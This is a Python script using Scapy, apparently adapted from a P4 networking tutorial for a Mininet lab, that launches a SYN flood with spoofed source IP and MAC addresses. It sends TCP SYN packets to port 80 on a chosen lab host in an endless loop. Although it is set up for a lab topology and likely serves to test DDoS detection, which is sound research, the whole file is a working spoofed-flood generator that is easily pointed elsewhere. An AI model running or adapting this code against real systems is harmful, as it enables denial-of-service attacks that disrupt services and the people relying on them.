#!/usr/bin/python3
# Copyright 2013-present Barefoot Networks, Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Adapted by Domitilia Noro - july 2023


from scapy.all import Ether, IP, sendp, get_if_hwaddr, get_if_list, TCP, Raw, UDP
from scapy.config import conf
import sys
import random, string
from time import sleep
from collections import Counter
import threading

def gen_pair():
    return "{}{}".format(str(random.choice("0123456789abcdef")),
                         str(random.choice("0123456789abcdef")))

def generate_mac_addr():
    return "{}:{}:{}:{}:{}:{}".format(gen_pair(),
                                      gen_pair(),
                                      gen_pair(),
                                      gen_pair(),
                                      gen_pair(),
                                      gen_pair())
    
def generate_ip_addr():
    return "{a}.{b}.{c}.{d}".format(a=random.randrange(20,200),
                                    b=random.randrange(10,200),
                                    c=random.randrange(1,254),
                                    d=random.randrange(1,254))

def generate_ip_part():
    return "{a}.{b}".format(a=random.randrange(20,200),
                            b=random.randrange(10,200))
# generate src DDoS networks
NUM_DDOS_NETWORKS = 10 
ddos_networks = [generate_ip_part() for i in range(NUM_DDOS_NETWORKS)]

print("Generating DDoS attack from the following networks:")
for net in ddos_networks:
    print("    {}.{}".format(net, "0.0/16"))

generated_ddos_networks = Counter()
def generate_ddos_network_ip():
    network_address = random.choice(ddos_networks)
    generated_ddos_networks[network_address] += 1
    return "{}.{}".format(network_address, generate_ip_part())

def generate_port():
    return random.randrange(1,6)

def randomword_data(max_length):
    length = random.randint(1, max_length)
    return "".join(random.choice(string.ascii_lowercase) for i in range(length))

def send_random_traffic(dst):
    dst_mac = None
    dst_ip = None
    interface = None
    #print get_if_list()
    src_mac = [get_if_hwaddr(i) for i in get_if_list() if "eth0" in i]
    interface = [i for i in get_if_list() if "eth0" in i][0]
    if len(src_mac) < 1:
        print ("No interface for output")
        sys.exit(1)
    src_mac = src_mac[0]
    src_ip = None
    if src_mac == "08:00:00:00:01:11":
        src_ip = "10.0.1.1"
    elif src_mac =="08:00:00:00:02:22":
        src_ip = "10.0.2.2"
    elif src_mac =="08:00:00:00:03:33":
        src_ip = "10.0.3.3"    
    elif src_mac =="08:00:00:00:04:44":
        src_ip = "10.0.4.4"
    elif src_mac =="08:00:00:00:09:99":
        src_ip = "10.0.9.9"    
    else:
        print ("Invalid source host")
        sys.exit(1)

    if dst in ("h1","10.0.1.1"):
        dst_mac = "08:00:00:00:01:11"
        dst_ip = "10.0.1.1"
    elif dst in ("h2","10.0.2.2"):
        dst_mac = "08:00:00:00:02:22"
        dst_ip = "10.0.2.2"
    elif dst in ("h3","10.0.3.3"):
        dst_mac = "08:00:00:00:03:33"
        dst_ip = "10.0.3.3"
    elif dst in ("h4","10.0.4.4"):
        dst_mac = "08:00:00:00:04:44"
        dst_ip = "10.0.4.4"  
    elif dst in ("h9","10.0.9.9"):
        dst_mac = "08:00:00:00:09:99"
        dst_ip = "10.0.9.9"      
    else:
        print ("Invalid host to send to")
        sys.exit(1)

    total_pkts = 0

    sports = random.sample(range(1024, 65535), 10)
    dports = random.sample(range(1024, 65535), 10)
    print("Generated src ports are: %s" % sports)
    print("Generated dst ports are: %s" % dports)
    #src_mac = "10:10:10:10:10:10" 
    src_mac = generate_mac_addr()
    #data = "ABCDFE" #randomword(10)
   
    s = conf.L2socket(iface=interface)
    while True:
        src_ip = generate_ddos_network_ip()
        sport = random.choice(sports)
        #dport = random.choice(dports)
        dport = 80
        p = Ether(dst=dst_mac,src=src_mac)/IP(dst=dst_ip,src=src_ip)
	    #p = Ether(dst=dst_mac,src=src_mac)/IP(flags = 0,dst=dst_ip,src=src_ip)
        ##data = randomword_data(10)
        seq_n = random.randint(0,65535)
        w_indow = random.randint(0,65535)
        p = p/TCP(sport=sport, dport=dport,flags="S",seq=seq_n, window=w_indow) ##/Raw(load=data)
        # p = p/TCP(dport=port)/Raw(load=data)
        #print("src: %s %s %s; dst: %s %s %s; seq: %s; window: %s" % (src_ip, src_mac, sport, dst_ip, dst_mac,dport,seq_n,w_indow))
        s.send(p)
        total_pkts += 1
        #if total_pkts % 1000 == 0:
        #    print("%s packets sent" % total_pkts)

def run_in_background():
    thread = threading.Thread(target=send_random_traffic, args=("h3",))
    thread.daemon = True
    thread.start()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python ddos_send.py dst_host_name")
        sys.exit(1)
    else:
        #dst_name = socket.gethostbyname(sys.argv[1])
        dst_name = sys.argv[1]
        send_random_traffic(dst_name)
